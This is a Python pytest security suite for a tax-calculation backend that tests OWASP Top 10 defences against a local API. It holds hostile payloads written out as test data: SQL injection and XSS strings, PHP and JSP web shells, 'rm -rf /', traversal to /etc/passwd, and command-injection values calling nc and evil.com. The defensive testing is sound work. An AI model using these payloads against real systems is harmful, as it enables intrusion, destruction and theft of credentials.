"""
Comprehensive security tests for Malta Tax AI Backend
Tests for OWASP Top 10 vulnerabilities and security best practices
"""
import pytest
import requests
import json
import base64
import time
from urllib.parse import quote


class TestSecurityVulnerabilities:
    """Security vulnerability tests based on OWASP Top 10"""
    
    BASE_URL = "http://localhost:5004"
    
    @classmethod
    def setup_class(cls):
        """Setup test class - ensure API is running"""
        try:
            response = requests.get(f"{cls.BASE_URL}/health")
            if response.status_code != 200:
                pytest.skip("API server not running")
        except requests.exceptions.ConnectionError:
            pytest.skip("API server not accessible")
    
    def test_sql_injection_protection(self):
        """Test protection against SQL injection attacks"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            # Test in various input fields
            test_data = {
                "annual_income": payload,
                "marital_status": "single"
            }
            
            response = requests.post(
                f"{self.BASE_URL}/api/tax/income-tax",
                json=test_data
            )
            
            # Should return 400 (bad request) or handle gracefully
            assert response.status_code in [400, 422]
            
            # Response should not contain SQL error messages
            response_text = response.text.lower()
            sql_error_indicators = [
                "sql", "syntax error", "mysql", "postgresql", 
                "sqlite", "database", "table", "column"
            ]
            
            for indicator in sql_error_indicators:
                assert indicator not in response_text
    
    def test_xss_protection(self):
        """Test protection against Cross-Site Scripting (XSS) attacks"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>"
        ]
        
        for payload in xss_payloads:
            test_data = {
                "taxpayer_name": payload,
                "annual_income": 50000,
                "marital_status": "single"
            }
            
            response = requests.post(
                f"{self.BASE_URL}/api/tax/income-tax",
                json=test_data
            )
            
            # Check that script tags are not reflected in response
            response_text = response.text
            assert "<script>" not in response_text.lower()
            assert "javascript:" not in response_text.lower()
            assert "onerror=" not in response_text.lower()
            assert "onload=" not in response_text.lower()
    
    def test_input_validation(self):
        """Test comprehensive input validation"""
        # Test oversized inputs
        large_string = "A" * 10000
        test_data = {
            "annual_income": large_string,
            "marital_status": "single"
        }
        
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json=test_data
        )
        
        assert response.status_code in [400, 422]
        
        # Test special characters
        special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?"
        test_data = {
            "annual_income": 50000,
            "marital_status": special_chars
        }
        
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json=test_data
        )
        
        assert response.status_code in [400, 422]
        
        # Test null bytes
        test_data = {
            "annual_income": "50000\x00",
            "marital_status": "single"
        }
        
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json=test_data
        )
        
        assert response.status_code in [400, 422]
    
    def test_authentication_security(self):
        """Test authentication and session security"""
        # Test admin endpoints without authentication
        admin_endpoints = [
            "/api/admin/dashboard",
            "/api/admin/users",
            "/api/admin/system-status"
        ]
        
        for endpoint in admin_endpoints:
            response = requests.get(f"{self.BASE_URL}{endpoint}")
            
            # Should require authentication
            assert response.status_code in [401, 403]
        
        # Test with invalid authentication
        headers = {"Authorization": "Bearer invalid_token"}
        
        for endpoint in admin_endpoints:
            response = requests.get(
                f"{self.BASE_URL}{endpoint}",
                headers=headers
            )
            
            assert response.status_code in [401, 403]
    
    def test_authorization_controls(self):
        """Test proper authorization controls"""
        # Test accessing admin functions with regular user credentials
        # This would require setting up test users with different roles
        
        # Test role-based access control
        test_endpoints = [
            ("/api/admin/users", "admin_only"),
            ("/api/batch/jobs", "admin_or_professional"),
            ("/api/tax/income-tax", "all_authenticated")
        ]
        
        for endpoint, required_role in test_endpoints:
            # Without authentication
            response = requests.get(f"{self.BASE_URL}{endpoint}")
            
            if required_role != "public":
                assert response.status_code in [401, 403]
    
    def test_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure"""
        # Test that error messages don't expose sensitive information
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json={"invalid": "data"}
        )
        
        response_text = response.text.lower()
        
        # Should not expose internal paths, database info, etc.
        sensitive_info = [
            "/home/", "/var/", "/etc/", "c:\\",
            "password", "secret", "key", "token",
            "database", "connection", "server",
            "traceback", "exception", "error:"
        ]
        
        for info in sensitive_info:
            assert info not in response_text
    
    def test_rate_limiting(self):
        """Test rate limiting protection"""
        # Make rapid requests to test rate limiting
        endpoint = f"{self.BASE_URL}/api/tax/income-tax"
        payload = {
            "annual_income": 50000,
            "marital_status": "single"
        }
        
        responses = []
        for i in range(20):  # Make 20 rapid requests
            response = requests.post(endpoint, json=payload)
            responses.append(response.status_code)
            time.sleep(0.1)  # Small delay
        
        # Should have some rate limiting after many requests
        rate_limited_responses = [code for code in responses if code == 429]
        
        # If rate limiting is implemented, we should see 429 responses
        # If not implemented, all should be 200 (which is also acceptable for now)
        assert all(code in [200, 429] for code in responses)
    
    def test_cors_security(self):
        """Test CORS (Cross-Origin Resource Sharing) security"""
        # Test CORS headers
        response = requests.options(f"{self.BASE_URL}/api/tax/income-tax")
        
        # Check for proper CORS headers
        headers = response.headers
        
        # Should have CORS headers but not be overly permissive
        if "Access-Control-Allow-Origin" in headers:
            origin = headers["Access-Control-Allow-Origin"]
            # Should not be wildcard (*) for authenticated endpoints
            # unless specifically designed for public access
            assert origin != "*" or response.status_code == 200
    
    def test_security_headers(self):
        """Test presence of security headers"""
        response = requests.get(f"{self.BASE_URL}/health")
        headers = response.headers
        
        # Check for important security headers
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": None,  # Should be present for HTTPS
            "Content-Security-Policy": None
        }
        
        for header, expected_value in security_headers.items():
            if header in headers:
                if expected_value:
                    if isinstance(expected_value, list):
                        assert headers[header] in expected_value
                    else:
                        assert headers[header] == expected_value
    
    def test_file_upload_security(self):
        """Test file upload security"""
        # Test malicious file uploads
        malicious_files = [
            ("test.php", "<?php system($_GET['cmd']); ?>"),
            ("test.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
            ("test.exe", b"\x4d\x5a\x90\x00"),  # PE header
            ("test.sh", "#!/bin/bash\nrm -rf /"),
            ("../../../etc/passwd", "root:x:0:0:root:/root:/bin/bash")
        ]
        
        for filename, content in malicious_files:
            # Simulate file upload
            files = {"file": (filename, content)}
            
            # Test document upload endpoint if it exists
            try:
                response = requests.post(
                    f"{self.BASE_URL}/api/documents/upload",
                    files=files
                )
                
                # Should reject malicious files
                assert response.status_code in [400, 403, 415, 422]
                
            except requests.exceptions.ConnectionError:
                # Endpoint might not exist, which is fine
                pass
    
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in various parameters
            response = requests.get(
                f"{self.BASE_URL}/api/documents/{quote(payload)}"
            )
            
            # Should not return file contents or 200 for system files
            assert response.status_code in [400, 403, 404]
            
            # Should not contain system file contents
            response_text = response.text.lower()
            assert "root:" not in response_text
            assert "administrator:" not in response_text
    
    def test_command_injection_protection(self):
        """Test protection against command injection"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "| nc -l 4444",
            "; curl http://evil.com",
            "&& ping google.com",
            "; cat /etc/shadow"
        ]
        
        for payload in command_injection_payloads:
            test_data = {
                "filename": f"document{payload}.pdf",
                "annual_income": 50000,
                "marital_status": "single"
            }
            
            response = requests.post(
                f"{self.BASE_URL}/api/tax/income-tax",
                json=test_data
            )
            
            # Should handle gracefully without executing commands
            assert response.status_code in [200, 400, 422]
            
            # Response should not contain command output
            response_text = response.text.lower()
            command_indicators = [
                "total ", "drwx", "-rw-", "root", "bin", "etc",
                "pong", "64 bytes", "ttl="
            ]
            
            for indicator in command_indicators:
                assert indicator not in response_text


class TestDataProtection:
    """Tests for data protection and privacy compliance"""
    
    BASE_URL = "http://localhost:5004"
    
    def test_sensitive_data_handling(self):
        """Test proper handling of sensitive financial data"""
        # Test that sensitive data is not logged or exposed
        sensitive_data = {
            "annual_income": 75000,
            "bank_account": "MT84MALT011000012345MTLCAST001S",
            "id_number": "123456M",
            "marital_status": "single"
        }
        
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json=sensitive_data
        )
        
        # Should process successfully
        assert response.status_code == 200
        
        # Check that sensitive data is not reflected in response unnecessarily
        response_text = response.text
        assert "123456M" not in response_text
        assert "MT84MALT" not in response_text
    
    def test_data_encryption_requirements(self):
        """Test data encryption requirements"""
        # For HTTPS endpoints, verify SSL/TLS
        # This would be more relevant in production environment
        
        # Test that sensitive endpoints require HTTPS in production
        # For now, verify that the API handles encryption properly
        
        response = requests.get(f"{self.BASE_URL}/health")
        assert response.status_code == 200
        
        # In production, this should redirect to HTTPS or require HTTPS
    
    def test_gdpr_compliance_features(self):
        """Test GDPR compliance features"""
        # Test data subject rights endpoints if implemented
        
        # Right to access
        try:
            response = requests.get(f"{self.BASE_URL}/api/privacy/data-export")
            # Should require authentication
            assert response.status_code in [401, 403, 404]
        except requests.exceptions.ConnectionError:
            pass  # Endpoint might not be implemented yet
        
        # Right to deletion
        try:
            response = requests.delete(f"{self.BASE_URL}/api/privacy/delete-data")
            # Should require authentication
            assert response.status_code in [401, 403, 404]
        except requests.exceptions.ConnectionError:
            pass  # Endpoint might not be implemented yet


class TestBusinessLogicSecurity:
    """Tests for business logic security vulnerabilities"""
    
    BASE_URL = "http://localhost:5004"
    
    def test_tax_calculation_integrity(self):
        """Test integrity of tax calculations"""
        # Test that tax calculations cannot be manipulated
        
        # Normal calculation
        normal_data = {
            "annual_income": 50000,
            "marital_status": "single"
        }
        
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json=normal_data
        )
        
        assert response.status_code == 200
        normal_tax = response.json()["total_tax"]
        
        # Test with negative income (should be handled properly)
        negative_data = {
            "annual_income": -50000,
            "marital_status": "single"
        }
        
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json=negative_data
        )
        
        # Should either reject or handle gracefully (not negative tax)
        if response.status_code == 200:
            negative_tax = response.json()["total_tax"]
            assert negative_tax >= 0  # Tax should not be negative
        else:
            assert response.status_code in [400, 422]
    
    def test_parameter_tampering(self):
        """Test protection against parameter tampering"""
        # Test that critical parameters cannot be tampered with
        
        # Attempt to tamper with tax rates
        tampered_data = {
            "annual_income": 50000,
            "marital_status": "single",
            "tax_rate": 0,  # Attempt to set tax rate to 0
            "override_calculation": True
        }
        
        response = requests.post(
            f"{self.BASE_URL}/api/tax/income-tax",
            json=tampered_data
        )
        
        # Should ignore tampered parameters
        assert response.status_code == 200
        result = response.json()
        assert result["total_tax"] > 0  # Should still calculate proper tax
    
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        import threading
        import queue
        
        results = queue.Queue()
        
        def concurrent_calculation():
            data = {
                "annual_income": 50000,
                "marital_status": "single"
            }
            
            response = requests.post(
                f"{self.BASE_URL}/api/tax/income-tax",
                json=data
            )
            
            if response.status_code == 200:
                results.put(response.json()["total_tax"])
            else:
                results.put(None)
        
        # Run multiple concurrent calculations
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=concurrent_calculation)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All results should be consistent
        tax_amounts = []
        while not results.empty():
            result = results.get()
            if result is not None:
                tax_amounts.append(result)
        
        # All calculations should return the same result
        if tax_amounts:
            first_amount = tax_amounts[0]
            assert all(abs(amount - first_amount) < 0.01 for amount in tax_amounts)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

